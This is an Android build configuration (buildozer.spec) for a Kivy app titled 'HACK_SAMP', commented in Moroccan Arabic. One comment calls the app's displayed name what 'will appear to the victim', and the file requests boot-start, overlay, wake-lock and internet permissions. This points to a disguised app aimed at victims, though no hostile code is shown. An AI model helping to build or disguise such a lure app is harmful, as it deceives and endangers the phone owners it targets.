[app]
# السمية اللي غاتبان للضحية
title = HACK_SAMP

# الباكيدج ديالك (خليناه كيف بغيتي)
package.name = f100striker
package.domain = org.teamf100

source.dir = .
# تأكد أن png موجودة هنا باش يقرا الأيقونة
source.include_exts = py,png,jpg,kv,atlas

# --- الأيقونة (المهم جداً) ---
# حيد '#' من هاد السطر إيلا كانت وزيد السمية ديال اللوغو
icon.filename = %(source.dir)s/team_f100.png

version = 1.0
requirements = python3,kivy

# الصلاحيات اللي كتبتي (صحيحة 100%)
android.permissions = INTERNET, RECEIVE_BOOT_COMPLETED, SYSTEM_ALERT_WINDOW, WAKE_LOCK

android.api = 31
android.minapi = 21
android.sdk = 31
android.archs = arm64-v8a, armeabi-v7a
android.wakelock = True